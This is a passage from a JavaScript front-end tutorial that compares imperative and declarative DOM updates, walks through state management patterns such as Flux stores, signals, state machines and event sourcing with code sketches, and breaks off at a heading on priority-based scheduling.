#### UI as Function of State

Declarative approaches treat the UI as a pure function of application state:

```javascript
function render(state) {
  return `
    <button class="${state.count > 10 ? 'warning' : 'btn-primary'}">
      Count: ${state.count}
    </button>
  `;
}
```

The function describes what the UI should look like for any given state, not how to transition between states.

#### Framework Implementation Patterns

Modern frameworks implement declarative APIs through various mechanisms:

**Virtual DOM diffing** (React, Preact):

```javascript
function Counter({ count }) {
  return <button className={count > 10 ? 'warning' : 'btn-primary'}>
    Count: {count}
  </button>;
}
```

The framework compares virtual representations and performs minimal DOM operations.

**Reactive templates** (Vue, Svelte):

```javascript
<button :class="count > 10 ? 'warning' : 'btn-primary'">
  Count: {{ count }}
</button>
```

Template syntax declares bindings; the framework tracks dependencies and updates automatically.

**Compiled templates** (Svelte): The compiler analyzes templates and generates optimized imperative code that only updates changed values.

#### Automatic Reconciliation

Declarative systems handle the imperative details:

- **Diffing algorithms**: Determine minimal set of DOM operations needed
- **Batch updates**: Group multiple state changes into single render cycles
- **Lifecycle management**: Automatically attach/detach event listeners
- **Memory management**: Clean up references when components unmount

### Performance Considerations

#### Imperative Advantages

- **Zero abstraction overhead**: Direct DOM calls have no intermediate layer
- **Surgical updates**: Can target exactly one property of one element
- **Predictable timing**: Operations execute immediately when called
- **Memory efficiency**: No virtual DOM or tracking structures required

Imperative is optimal for:

- High-frequency updates to small DOM portions (canvas animations, real-time data)
- Performance-critical paths where every millisecond matters
- Simple interactions that don't justify framework overhead

#### Declarative Trade-offs

- **Reconciliation cost**: Diffing algorithms add computational overhead
- **Memory overhead**: Virtual DOM or dependency tracking structures consume memory
- **Batch timing**: Updates may not reflect immediately (wait for render cycle)
- **Over-rendering**: [Inference] May re-render components that haven't actually changed without proper optimization

Declarative becomes advantageous when:

- UI complexity increases (many interdependent elements)
- State changes are frequent and affect multiple DOM locations
- Development velocity matters more than microsecond optimizations
- Team collaboration benefits from consistent patterns

### Composition and Modularity

#### Imperative Composition Challenges

Combining imperative DOM manipulations requires careful coordination:

```javascript
function createWidget(container) {
  const div = document.createElement('div');
  const title = document.createElement('h3');
  const content = document.createElement('p');
  
  // Manual tree construction
  div.appendChild(title);
  div.appendChild(content);
  container.appendChild(div);
  
  // Caller must track div reference for later updates
  return { element: div, update: (data) => { /* manual update */ } };
}
```

Each component must expose imperative update methods, creating tightly coupled APIs.

#### Declarative Composition

Declarative components compose naturally through nesting:

```javascript
function Widget({ title, content }) {
  return (
    <div>
      <Title text={title} />
      <Content text={content} />
    </div>
  );
}
```

Components are self-contained and rerender automatically when props change. Parent components don't manually orchestrate child updates.

### Event Handling Models

#### Imperative Event Management

```javascript
const button = document.getElementById('btn');
const handler = (e) => { /* ... */ };

button.addEventListener('click', handler);

// Manual cleanup required
function cleanup() {
  button.removeEventListener('click', handler);
}
```

The developer manages listener lifecycle explicitly, risking memory leaks if cleanup is forgotten.

#### Declarative Event Binding

```javascript
<button onClick={handleClick}>Click</button>
```

The framework automatically attaches listeners during mount and detaches during unmount. Event delegation patterns are often used internally for performance.

### Debugging and Predictability

#### Imperative Debugging

- **Call stack visibility**: Each DOM operation appears in stack traces
- **Breakpoint precision**: Can pause at exact mutation points
- **State inspection**: DOM state is always current and inspectable
- **No magic**: Every operation is explicit in the code

#### Declarative Debugging

- **Indirect mutations**: Framework performs actual DOM operations, not user code
- **Render cycle complexity**: Multiple state changes may batch into single update
- **DevTools dependence**: React DevTools, Vue DevTools required for effective debugging
- **Time-travel debugging**: Some frameworks enable state replay capabilities

[Inference] Imperative code is generally more straightforward to debug for developers unfamiliar with framework internals, while declarative code benefits from framework-specific tooling that can provide insights impossible in raw imperative code.

### Hybrid Approaches

#### Escape Hatches in Declarative Frameworks

Frameworks provide imperative access when needed:

**React refs**:

```javascript
const inputRef = useRef();

useEffect(() => {
  inputRef.current.focus(); // Imperative DOM operation
}, []);

return <input ref={inputRef} />;
```

**Vue template refs**:

```javascript
this.$refs.input.focus();
```

These allow imperative operations within declarative structures for cases where declarative APIs are insufficient (third-party library integration, focus management, canvas manipulation).

#### Declarative Primitives in Vanilla JS

Modern DOM APIs incorporate declarative patterns:

```javascript
// Declarative HTML
element.innerHTML = `<div class="card">${content}</div>`;

// Declarative styling
element.style.cssText = 'color: red; font-size: 16px;';

// Declarative attributes
element.setAttribute('data-state', 'active');
```

These APIs describe desired state rather than individual property mutations, though they still execute imperatively under the hood.

### Code Maintenance and Scalability

#### Imperative Maintenance Challenges

As applications grow, imperative code faces:

- **Update explosion**: Each new state property requires finding and updating all relevant DOM locations
- **Conditional complexity**: Nested if/else blocks for UI variations become difficult to reason about
- **Refactoring difficulty**: Moving DOM elements requires updating all imperative references
- **Bug surface area**: More code paths mean more potential for inconsistent state

#### Declarative Scaling Benefits

Declarative code maintains clarity as complexity increases:

- **Localized changes**: Modifying UI output requires only changing the render function
- **Declarative conditionals**: JSX ternaries or template directives are self-documenting
- **Automatic consistency**: Framework ensures state and DOM stay synchronized
- **Component isolation**: Each component manages its own declarative logic independently

[Inference] Teams working on large applications typically find declarative approaches reduce cognitive load and defect rates, though this comes at the cost of framework dependency and learning curve.

### Performance Optimization Patterns

#### Imperative Optimization

```javascript
// Batch DOM reads and writes
const heights = elements.map(el => el.offsetHeight); // Read phase
elements.forEach((el, i) => el.style.height = heights[i] + 'px'); // Write phase

// Use DocumentFragment for batch insertions
const fragment = document.createDocumentFragment();
items.forEach(item => fragment.appendChild(createItem(item)));
container.appendChild(fragment); // Single reflow
```

Optimization requires understanding browser rendering pipeline and manually orchestrating operations.

#### Declarative Optimization

```javascript
// React memoization
const MemoizedComponent = React.memo(ExpensiveComponent);

// Vue computed properties
computed: {
  filteredItems() {
    return this.items.filter(item => item.active);
  }
}

// Keys for efficient reconciliation
{items.map(item => <Item key={item.id} {...item} />)}
```

Optimization happens through framework-specific APIs that hint to the reconciliation engine which components can skip re-rendering.

---

## State Management Patterns

### Primitive State Patterns

#### Direct DOM Manipulation

The most basic pattern involves storing state directly in DOM properties and attributes. State reads occur through property access (`element.value`, `element.checked`) and writes through direct assignment. This creates tight coupling between state and view, making state difficult to track across the application.

```javascript
// State lives in DOM
input.value = 'current state';
const state = input.value;
```

The pattern breaks down when multiple views depend on the same state or when state changes need to propagate to disconnected parts of the interface. No central source of truth exists.

#### Global Variable State

State stored in global or module-scoped variables provides a single source of truth but lacks structure for managing updates or notifying dependent views.

```javascript
let appState = { count: 0, user: null };

function increment() {
  appState.count++;
  updateView(); // Manual synchronization required
}
```

The primary issue is manual synchronization—every state mutation requires explicit view update calls. Missing an update call creates inconsistency between state and UI. Tracking which components depend on which state becomes implicit and error-prone.

### Observer Pattern (Pub/Sub)

The observer pattern decouples state mutations from view updates through a subscription mechanism. Components subscribe to state changes and receive notifications when mutations occur.

```javascript
class Observable {
  constructor(initialState) {
    this.state = initialState;
    this.listeners = [];
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
  
  setState(newState) {
    this.state = { ...this.state, ...newState };
    this.listeners.forEach(listener => listener(this.state));
  }
  
  getState() {
    return this.state;
  }
}
```

This pattern enables one-to-many relationships where a single state change notifies all subscribers. Subscribers don't need knowledge of other subscribers, reducing coupling.

**Granular subscriptions** improve performance by allowing components to subscribe to specific state slices:

```javascript
class StateManager {
  constructor(initialState) {
    this.state = initialState;
    this.listeners = new Map(); // key -> Set of listeners
  }
  
  subscribe(key, listener) {
    if (!this.listeners.has(key)) {
      this.listeners.set(key, new Set());
    }
    this.listeners.get(key).add(listener);
    
    return () => this.listeners.get(key).delete(listener);
  }
  
  setState(key, value) {
    this.state[key] = value;
    if (this.listeners.has(key)) {
      this.listeners.get(key).forEach(fn => fn(value));
    }
  }
}
```

### Reactive State (Proxy-Based)

Modern JavaScript Proxies enable automatic dependency tracking and reactive updates without explicit subscription calls. The proxy intercepts property access and mutations.

```javascript
function createReactive(target, onChange) {
  return new Proxy(target, {
    get(obj, prop) {
      // Track which properties are accessed
      return obj[prop];
    },
    set(obj, prop, value) {
      obj[prop] = value;
      onChange(prop, value);
      return true;
    }
  });
}

const state = createReactive({ count: 0 }, (prop, value) => {
  console.log(`${prop} changed to ${value}`);
  updateView();
});

state.count++; // Automatically triggers onChange
```

**Nested reactivity** requires recursive proxy wrapping:

```javascript
function deepReactive(target, onChange) {
  const handler = {
    get(obj, prop) {
      const value = obj[prop];
      if (typeof value === 'object' && value !== null) {
        return new Proxy(value, handler);
      }
      return value;
    },
    set(obj, prop, value) {
      obj[prop] = value;
      onChange([prop], value); // Path tracking needed for nested updates
      return true;
    }
  };
  
  return new Proxy(target, handler);
}
```

Proxy-based reactivity eliminates boilerplate subscription code but adds overhead to every property access. Performance degrades with deeply nested objects accessed frequently.

### Unidirectional Data Flow (Flux Pattern)

Flux architecture enforces a single direction for data flow: Actions → Dispatcher → Store → View. This eliminates circular dependencies and makes state changes predictable.

```javascript
class Store {
  constructor(reducer, initialState) {
    this.state = initialState;
    this.reducer = reducer;
    this.listeners = [];
  }
  
  dispatch(action) {
    this.state = this.reducer(this.state, action);
    this.listeners.forEach(listener => listener(this.state));
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
  
  getState() {
    return this.state;
  }
}

function reducer(state, action) {
  switch (action.type) {
    case 'INCREMENT':
      return { ...state, count: state.count + 1 };
    case 'SET_USER':
      return { ...state, user: action.payload };
    default:
      return state;
  }
}

const store = new Store(reducer, { count: 0, user: null });
```

**Action creators** encapsulate action construction:

```javascript
const actions = {
  increment: () => ({ type: 'INCREMENT' }),
  setUser: (user) => ({ type: 'SET_USER', payload: user })
};

store.dispatch(actions.increment());
```

The pattern enforces immutability—reducers must return new state objects rather than mutating existing state. This enables time-travel debugging and simplifies change detection through reference equality checks.

**Middleware** intercepts actions between dispatch and reducer:

```javascript
function createStore(reducer, initialState, middleware = []) {
  let state = initialState;
  const listeners = [];
  
  let dispatch = (action) => {
    state = reducer(state, action);
    listeners.forEach(l => l(state));
  };
  
  // Wrap dispatch with middleware
  middleware.forEach(mw => {
    dispatch = mw({ getState, dispatch })(dispatch);
  });
  
  function getState() { return state; }
  function subscribe(listener) {
    listeners.push(listener);
    return () => listeners.splice(listeners.indexOf(listener), 1);
  }
  
  return { dispatch, getState, subscribe };
}

// Logger middleware
const logger = store => next => action => {
  console.log('dispatching', action);
  const result = next(action);
  console.log('next state', store.getState());
  return result;
};
```

### Selector Pattern

Selectors are functions that extract and compute derived state from the store. They encapsulate state shape knowledge and enable memoization.

```javascript
const selectors = {
  getCount: state => state.count,
  getUser: state => state.user,
  getUserName: state => state.user?.name ?? 'Guest',
  getDoubleCount: state => state.count * 2
};

const count = selectors.getCount(store.getState());
```

**Memoized selectors** cache computed values and only recalculate when dependencies change:

```javascript
function createSelector(dependencies, computeFn) {
  let lastArgs = [];
  let lastResult;
  
  return (state) => {
    const args = dependencies.map(dep => dep(state));
    
    // Shallow equality check on dependencies
    if (args.length === lastArgs.length &&
        args.every((arg, i) => arg === lastArgs[i])) {
      return lastResult;
    }
    
    lastArgs = args;
    lastResult = computeFn(...args);
    return lastResult;
  };
}

const getExpensiveData = createSelector(
  [state => state.items, state => state.filter],
  (items, filter) => {
    console.log('Computing filtered items');
    return items.filter(item => item.type === filter);
  }
);
```

Memoization prevents unnecessary recomputation when unrelated state changes. [Inference: Most selector libraries use similar dependency tracking mechanisms.]

### Component-Local State

Component-local state isolates state to a specific component tree, preventing unnecessary global pollution.

```javascript
class Component {
  constructor(element) {
    this.element = element;
    this.state = {};
    this.render();
  }
  
  setState(partial) {
    this.state = { ...this.state, ...partial };
    this.render();
  }
  
  render() {
    // Override in subclass
  }
}

class Counter extends Component {
  constructor(element) {
    super(element);
    this.state = { count: 0 };
  }
  
  render() {
    this.element.innerHTML = `
      <div>Count: ${this.state.count}</div>
      <button>Increment</button>
    `;
    
    this.element.querySelector('button').onclick = () => {
      this.setState({ count: this.state.count + 1 });
    };
  }
}
```

**State lifting** moves state up the component tree when multiple components need access:

```javascript
class Parent extends Component {
  constructor(element) {
    super(element);
    this.state = { sharedData: 0 };
  }
  
  updateShared = (value) => {
    this.setState({ sharedData: value });
  }
  
  render() {
    const child1 = new Child(this.state.sharedData, this.updateShared);
    const child2 = new Child(this.state.sharedData, this.updateShared);
    // Render children
  }
}
```

### Immutable Update Patterns

Immutability enables efficient change detection through reference equality and prevents accidental mutations.

**Object spread for shallow updates:**

```javascript
const newState = {
  ...state,
  count: state.count + 1
};
```

**Nested updates require spreading at each level:**

```javascript
const newState = {
  ...state,
  user: {
    ...state.user,
    profile: {
      ...state.user.profile,
      name: 'New Name'
    }
  }
};
```

**Array operations:**

```javascript
// Add item
const newArray = [...state.items, newItem];

// Remove item
const newArray = state.items.filter(item => item.id !== removeId);

// Update item
const newArray = state.items.map(item =>
  item.id === updateId ? { ...item, ...updates } : item
);

// Insert at index
const newArray = [
  ...state.items.slice(0, index),
  newItem,
  ...state.items.slice(index)
];
```

**Immer-style patterns** use a draft object that tracks mutations and produces an immutable result:

```javascript
function produce(baseState, recipe) {
  const draft = JSON.parse(JSON.stringify(baseState)); // Deep clone
  recipe(draft);
  return draft;
}

const newState = produce(state, draft => {
  draft.user.profile.name = 'New Name';
  draft.items.push(newItem);
});
```

[Inference: The actual Immer library uses Proxies for more efficient change tracking than JSON cloning.]

### Context/Dependency Injection Pattern

Context provides state to deeply nested components without prop drilling.

```javascript
class Context {
  constructor(defaultValue) {
    this.value = defaultValue;
    this.listeners = [];
  }
  
  provide(value) {
    this.value = value;
    this.listeners.forEach(listener => listener(value));
  }
  
  consume(callback) {
    callback(this.value);
    this.listeners.push(callback);
    
    return () => {
      this.listeners = this.listeners.filter(l => l !== callback);
    };
  }
}

const ThemeContext = new Context('light');

// Provider component
function App() {
  ThemeContext.provide('dark');
  // Render children
}

// Consumer component (deeply nested)
function Button() {
  ThemeContext.consume(theme => {
    element.className = theme === 'dark' ? 'btn-dark' : 'btn-light';
  });
}
```

**Multiple contexts** enable different concerns:

```javascript
const contexts = {
  theme: new Context('light'),
  user: new Context(null),
  language: new Context('en')
};
```

### State Machine Pattern

State machines model state as discrete modes with defined transitions, preventing invalid states.

```javascript
class StateMachine {
  constructor(config) {
    this.config = config;
    this.state = config.initial;
    this.listeners = [];
  }
  
  transition(event) {
    const currentState = this.config.states[this.state];
    const transition = currentState.on?.[event];
    
    if (!transition) {
      console.warn(`No transition for ${event} in ${this.state}`);
      return;
    }
    
    this.state = transition;
    this.listeners.forEach(listener => listener(this.state));
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
  
  getState() {
    return this.state;
  }
}

const fetchMachine = new StateMachine({
  initial: 'idle',
  states: {
    idle: {
      on: { FETCH: 'loading' }
    },
    loading: {
      on: {
        SUCCESS: 'success',
        ERROR: 'error'
      }
    },
    success: {
      on: { FETCH: 'loading' }
    },
    error: {
      on: { RETRY: 'loading' }
    }
  }
});
```

**Extended state** (context) holds data alongside the state:

```javascript
class StateMachineWithContext {
  constructor(config) {
    this.config = config;
    this.state = config.initial;
    this.context = config.context || {};
    this.listeners = [];
  }
  
  transition(event, payload) {
    const currentState = this.config.states[this.state];
    const transition = currentState.on?.[event];
    
    if (!transition) return;
    
    // Execute action if defined
    if (transition.action) {
      this.context = transition.action(this.context, payload);
    }
    
    this.state = transition.target;
    this.listeners.forEach(listener => listener({
      state: this.state,
      context: this.context
    }));
  }
}

const fetchMachine = new StateMachineWithContext({
  initial: 'idle',
  context: { data: null, error: null },
  states: {
    idle: {
      on: {
        FETCH: {
          target: 'loading',
          action: (ctx) => ({ ...ctx, error: null })
        }
      }
    },
    loading: {
      on: {
        SUCCESS: {
          target: 'success',
          action: (ctx, payload) => ({ ...ctx, data: payload })
        },
        ERROR: {
          target: 'error',
          action: (ctx, payload) => ({ ...ctx, error: payload })
        }
      }
    }
  }
});
```

### Atomic State Pattern

Atoms represent individual pieces of state that can be independently subscribed to and updated.

```javascript
function atom(initialValue) {
  let value = initialValue;
  const listeners = new Set();
  
  return {
    get() {
      return value;
    },
    set(newValue) {
      value = typeof newValue === 'function' ? newValue(value) : newValue;
      listeners.forEach(listener => listener(value));
    },
    subscribe(listener) {
      listeners.add(listener);
      return () => listeners.delete(listener);
    }
  };
}

const countAtom = atom(0);
const userAtom = atom(null);

countAtom.subscribe(count => {
  document.getElementById('count').textContent = count;
});

countAtom.set(count => count + 1);
```

**Derived atoms** compute values from other atoms:

```javascript
function derived(dependencies, computeFn) {
  const result = atom(computeFn(...dependencies.map(d => d.get())));
  
  dependencies.forEach(dep => {
    dep.subscribe(() => {
      result.set(computeFn(...dependencies.map(d => d.get())));
    });
  });
  
  return {
    get: result.get,
    subscribe: result.subscribe
  };
}

const doubleCountAtom = derived([countAtom], count => count * 2);
```

### Signal Pattern

Signals combine reactive values with automatic dependency tracking during computation.

```javascript
let currentListener = null;

function signal(initialValue) {
  let value = initialValue;
  const listeners = new Set();
  
  return {
    get value() {
      if (currentListener) {
        listeners.add(currentListener);
      }
      return value;
    },
    set value(newValue) {
      value = newValue;
      listeners.forEach(listener => listener());
    }
  };
}

function computed(fn) {
  const sig = signal(undefined);
  
  function recompute() {
    const prevListener = currentListener;
    currentListener = recompute;
    sig.value = fn();
    currentListener = prevListener;
  }
  
  recompute();
  
  return {
    get value() {
      return sig.value;
    }
  };
}

const count = signal(0);
const double = computed(() => count.value * 2);

console.log(double.value); // 0
count.value = 5;
console.log(double.value); // 10 (automatically updated)
```

**Effect functions** run side effects when dependencies change:

```javascript
function effect(fn) {
  const execute = () => {
    const prevListener = currentListener;
    currentListener = execute;
    fn();
    currentListener = prevListener;
  };
  
  execute();
}

effect(() => {
  document.getElementById('count').textContent = count.value;
  // Automatically re-runs when count changes
});
```

### Command Pattern for State Changes

Commands encapsulate state mutations as objects that can be executed, undone, and logged.

```javascript
class Command {
  execute() {}
  undo() {}
}

class IncrementCommand extends Command {
  constructor(state) {
    super();
    this.state = state;
  }
  
  execute() {
    this.state.count++;
  }
  
  undo() {
    this.state.count--;
  }
}

class CommandManager {
  constructor() {
    this.history = [];
    this.currentIndex = -1;
  }
  
  execute(command) {
    // Remove any commands after current position
    this.history = this.history.slice(0, this.currentIndex + 1);
    
    command.execute();
    this.history.push(command);
    this.currentIndex++;
  }
  
  undo() {
    if (this.currentIndex < 0) return;
    
    this.history[this.currentIndex].undo();
    this.currentIndex--;
  }
  
  redo() {
    if (this.currentIndex >= this.history.length - 1) return;
    
    this.currentIndex++;
    this.history[this.currentIndex].execute();
  }
}
```

### Transactional State Updates

Transactions batch multiple state changes into a single atomic operation, preventing intermediate states from triggering updates.

```javascript
class TransactionalStore {
  constructor(initialState) {
    this.state = initialState;
    this.listeners = [];
    this.inTransaction = false;
    this.pendingChanges = {};
  }
  
  beginTransaction() {
    this.inTransaction = true;
    this.pendingChanges = {};
  }
  
  commit() {
    if (!this.inTransaction) return;
    
    this.state = { ...this.state, ...this.pendingChanges };
    this.inTransaction = false;
    this.pendingChanges = {};
    this.notify();
  }
  
  rollback() {
    this.inTransaction = false;
    this.pendingChanges = {};
  }
  
  setState(key, value) {
    if (this.inTransaction) {
      this.pendingChanges[key] = value;
    } else {
      this.state[key] = value;
      this.notify();
    }
  }
  
  notify() {
    this.listeners.forEach(listener => listener(this.state));
  }
}

const store = new TransactionalStore({ x: 0, y: 0 });

store.beginTransaction();
store.setState('x', 10);
store.setState('y', 20);
store.commit(); // Single notification with both changes
```

### Snapshot Pattern

Snapshots capture state at a point in time for undo/redo or debugging.

```javascript
class SnapshotManager {
  constructor(initialState) {
    this.snapshots = [JSON.parse(JSON.stringify(initialState))];
    this.currentIndex = 0;
  }
  
  takeSnapshot(state) {
    // Remove any snapshots after current position
    this.snapshots = this.snapshots.slice(0, this.currentIndex + 1);
    this.snapshots.push(JSON.parse(JSON.stringify(state)));
    this.currentIndex++;
  }
  
  undo() {
    if (this.currentIndex > 0) {
      this.currentIndex--;
      return this.snapshots[this.currentIndex];
    }
    return null;
  }
  
  redo() {
    if (this.currentIndex < this.snapshots.length - 1) {
      this.currentIndex++;
      return this.snapshots[this.currentIndex];
    }
    return null;
  }
  
  getCurrentSnapshot() {
    return this.snapshots[this.currentIndex];
  }
}
```

**Structural sharing** reduces memory overhead by sharing unchanged portions:

```javascript
// [Inference: Libraries like Immutable.js use persistent data structures]
// that reuse unchanged subtrees between versions

function createVersionedState(initialState) {
  const versions = [initialState];
  let current = 0;
  
  return {
    update(path, value) {
      // Only clone affected path
      const newState = updatePath(versions[current], path, value);
      versions.push(newState);
      current++;
      return newState;
    },
    undo() {
      if (current > 0) current--;
      return versions[current];
    }
  };
}
```

### Event Sourcing Pattern

Instead of storing current state, store the sequence of events that led to that state. Current state is derived by replaying events.

```javascript
class EventStore {
  constructor() {
    this.events = [];
    this.currentState = {};
    this.handlers = {};
  }
  
  registerHandler(eventType, handler) {
    this.handlers[eventType] = handler;
  }
  
  dispatch(event) {
    this.events.push({
      ...event,
      timestamp: Date.now()
    });
    
    const handler = this.handlers[event.type];
    if (handler) {
      this.currentState = handler(this.currentState, event);
    }
  }
  
  replayEvents(events = this.events) {
    let state = {};
    events.forEach(event => {
      const handler = this.handlers[event.type];
      if (handler) {
        state = handler(state, event);
      }
    });
    return state;
  }
  
  getState() {
    return this.currentState;
  }
  
  getEventHistory() {
    return this.events;
  }
}

const store = new EventStore();

store.registerHandler('USER_CREATED', (state, event) => ({
  ...state,
  users: [...(state.users || []), event.payload]
}));

store.registerHandler('USER_UPDATED', (state, event) => ({
  ...state,
  users: state.users.map(u => 
    u.id === event.payload.id ? { ...u, ...event.payload } : u
  )
}));
```

Event sourcing enables time-travel debugging, audit logs, and replaying state at any point.

### Optimistic Updates Pattern

Optimistic updates apply changes immediately to the UI while the actual operation executes asynchronously. If the operation fails, the state reverts.

```javascript
class OptimisticStore {
  constructor(initialState) {
    this.committedState = initialState;
    this.optimisticState = initialState;
    this.pendingOps = [];
    this.listeners = [];
  }
  
  async update(key, value, asyncOperation) {
    const operationId = Math.random();
    
    // Apply optimistically
    this.optimisticState = {
      ...this.optimisticState,
      [key]: value
    };
    
    this.pendingOps.push(operationId);
    this.notify();
    
    try {
      await asyncOperation();
      
      // Commit
      this.committedState = {
        ...this.committedState,
        [key]: value
      };
    } catch (error) {
      // Revert optimistic update
      this.optimisticState = { ...this.committedState };
    } finally {
      this.pendingOps = this.pendingOps.filter(id => id !== operationId);
      this.notify();
    }
  }
  
  getState() {
    return this.optimisticState;
  }
  
  isPending() {
    return this.pendingOps.length > 0;
  }
  
  notify() {
    this.listeners.forEach(l => l(this.optimisticState));
  }
}
```

### Normalization Pattern

Normalized state stores entities by ID in flat structures, preventing duplication and simplifying updates.

```javascript
// Denormalized (nested)
const state = {
  posts: [
    {
      id: 1,
      title: 'Post 1',
      author: { id: 1, name: 'Alice' },
      comments: [
        { id: 1, text: 'Comment 1', author: { id: 2, name: 'Bob' } }
      ]
    }
  ]
};

// Normalized (flat)
const normalizedState = {
  entities: {
    posts: {
      '1': { id: 1, title: 'Post 1', author: 1, comments: [1] }
    },
    users: {
      '1': { id: 1, name: 'Alice' },
      '2': { id: 2, name: 'Bob' }
    },
    comments: {
      '1': { id: 1, text: 'Comment 1', author: 2 }
    }
  },
  result: [1]
};

// Update user once, affects all references
function updateUser(state, userId, updates) {
  return {
    ...state,
    entities: {
      ...state.entities,
      users: {
        ...state.entities.users,
        [userId]: { ...state.entities.users[userId], ...updates }
      }
    }
  };
}
```

**Selectors denormalize for consumption:**

```javascript
function getPostWithAuthor(state, postId) {
  const post = state.entities.posts[postId];
  const author = state.entities.users[post.author];
  
  return {
    ...post,
    author
  };
}
```

### Middleware Patterns

Middleware intercepts actions to add cross-cutting concerns like logging, analytics, persistence, or async handling.

**Async middleware** handles promises:

```javascript
const asyncMiddleware = store => next => action => {
  if (typeof action.payload === 'object' && action.payload.then) {
    action.payload
      .then(result => next({ ...action, payload: result }))
      .catch(error => next({ type: action.type + '_ERROR', payload: error }));
    return;
  }
  
  return next(action);
};
```

**Persistence middleware** saves state to localStorage:

```javascript
const persistenceMiddleware = store => next => action => {
  const result = next(action);
  localStorage.setItem('appState', JSON.stringify(store.getState()));
  return result;
};
```

**Batching middleware** collects multiple synchronous dispatches:

```javascript
const batchMiddleware = store => {
  let queue = [];
  let scheduled = false;
  
  return next => action => {
    queue.push(action);
    
    if (!scheduled) {
      scheduled = true;
      queueMicrotask(() => {
        const actions = queue;
        queue = [];
        scheduled = false;
        
        actions.forEach(a => next(a));
      });
    }
  };
};
```

### Computed/Derived State

Derived state is calculated from source state rather than stored redundantly.

```javascript
class Store {
  constructor(initialState) {
    this.state = initialState;
    this.computedCache = new Map();
    this.listeners = [];
  }
  
  computed(key, computeFn, dependencies) {
    const getDependencyValues = () => 
      dependencies.map(dep => this.state[dep]);
    
    // Initial computation
    let lastDeps = getDependencyValues();
    this.computedCache.set(key, computeFn(...lastDeps));
    
    // Recompute when dependencies change
    this.subscribe(() => {
      const currentDeps = getDependencyValues();
      const changed = currentDeps.some((val, i) => val !== lastDeps[i]);
      
      if (changed) {
        lastDeps = currentDeps;
        this.computedCache.set(key, computeFn(...currentDeps));
      }
    });
    
    return () => this.computedCache.get(key);
  }
}

const store = new Store({ items: [], filter: 'all' });

const getFilteredItems = store.computed(
  'filteredItems',
  (items, filter) => items.filter(item => 
    filter === 'all' || item.category === filter
  ),
  ['items', 'filter']
);
```

### Comparison: Pattern Selection Criteria

**Use direct DOM manipulation** for simple forms with isolated state needs.

**Use global variables** for genuinely application-wide singleton state like theme or auth status where no complex updates occur.

**Use Observer pattern** when multiple disconnected components need to react to the same state changes.

**Use Proxy-based reactivity** when automatic dependency tracking significantly reduces boilerplate compared to manual subscriptions.

**Use Flux/Redux** for complex applications requiring predictable state updates, time-travel debugging, or middleware integration. [Inference: Most commonly adopted in large-scale applications.]

**Use State Machines** for UI with distinct modes (loading/success/error) or complex workflows with defined transitions.

**Use Atoms/Signals** for fine-grained reactivity where different components subscribe to different slices of state independently.

**Use Event Sourcing** when audit trails, undo/redo, or debugging history are critical requirements.

**Use Optimistic Updates** for perceived performance in applications with network latency.

**Use Normalization** when the same entities appear in multiple places and need consistent updates.

---

## Reactive Updates in DOM/JavaScript

### Core Reactivity Mechanisms

#### Signal-Based Reactivity

Signals represent the fundamental unit of reactive state, consisting of three primitives: signals (state containers), computeds (derived state), and effects (side effects). When a signal's value changes, all dependent computeds and effects automatically re-execute.

```javascript
// Basic signal implementation
function createSignal(initialValue) {
  let value = initialValue;
  const subscribers = new Set();
  
  const read = () => {
    if (currentEffect) subscribers.add(currentEffect);
    return value;
  };
  
  const write = (newValue) => {
    value = newValue;
    subscribers.forEach(effect => effect());
  };
  
  return [read, write];
}

let currentEffect = null;

function createEffect(fn) {
  currentEffect = fn;
  fn();
  currentEffect = null;
}
```

The dependency tracking occurs automatically during the read operation. When an effect executes, it becomes the "current effect" and any signals read during execution register it as a subscriber. This eliminates manual dependency declaration.

#### Observable Pattern

Observables use explicit subscription mechanisms where observers register callbacks that fire on state changes. Unlike signals, observables don't automatically track dependencies—subscriptions must be manually managed.

```javascript
class Observable {
  constructor(value) {
    this._value = value;
    this._observers = [];
  }
  
  get value() {
    return this._value;
  }
  
  set value(newValue) {
    if (this._value !== newValue) {
      this._value = newValue;
      this._notify();
    }
  }
  
  subscribe(callback) {
    this._observers.push(callback);
    return () => {
      this._observers = this._observers.filter(obs => obs !== callback);
    };
  }
  
  _notify() {
    this._observers.forEach(callback => callback(this._value));
  }
}
```

#### Proxy-Based Reactivity

Proxies intercept property access and mutations on objects, enabling fine-grained reactivity without explicit wrappers. Vue 3's reactivity system exemplifies this approach.

```javascript
function reactive(target) {
  const handler = {
    get(target, property, receiver) {
      track(target, property);
      const value = Reflect.get(target, property, receiver);
      return typeof value === 'object' ? reactive(value) : value;
    },
    
    set(target, property, value, receiver) {
      const result = Reflect.set(target, property, value, receiver);
      trigger(target, property);
      return result;
    }
  };
  
  return new Proxy(target, handler);
}

const targetMap = new WeakMap();
let activeEffect = null;

function track(target, property) {
  if (!activeEffect) return;
  
  let depsMap = targetMap.get(target);
  if (!depsMap) {
    targetMap.set(target, (depsMap = new Map()));
  }
  
  let dep = depsMap.get(property);
  if (!dep) {
    depsMap.set(property, (dep = new Set()));
  }
  
  dep.add(activeEffect);
}

function trigger(target, property) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;
  
  const dep = depsMap.get(property);
  if (dep) {
    dep.forEach(effect => effect());
  }
}
```

### Scheduling and Batching

#### Microtask Scheduling

Updates scheduled as microtasks execute after the current synchronous code completes but before the next rendering frame. This consolidates multiple synchronous updates into a single DOM update.

```javascript
class Scheduler {
  constructor() {
    this.queue = new Set();
    this.flushing = false;
  }
  
  schedule(effect) {
    this.queue.add(effect);
    if (!this.flushing) {
      this.flushing = true;
      queueMicrotask(() => this.flush());
    }
  }
  
  flush() {
    const effects = Array.from(this.queue);
    this.queue.clear();
    this.flushing = false;
    effects.forEach(effect => effect());
  }
}
```

#### Transaction-Based Batching

Transactions group multiple state changes, deferring all effects until the transaction commits. This prevents intermediate states from triggering updates.

```javascript
let batchDepth = 0;
const pendingEffects = new Set();

function batch(fn) {
  batchDepth++;
  try {
    fn();
  } finally {
    batchDepth--;
    if (batchDepth === 0) {
      const effects = Array.from(pendingEffects);
      pendingEffects.clear();
      effects.forEach(effect => effect());
    }
  }
}

function scheduleEffect(effect) {
  if (batchDepth > 0) {
    pendingEffects.add(effect);
  } else {
    effect();
  }
}
```

#### Priority-Based Scheduling

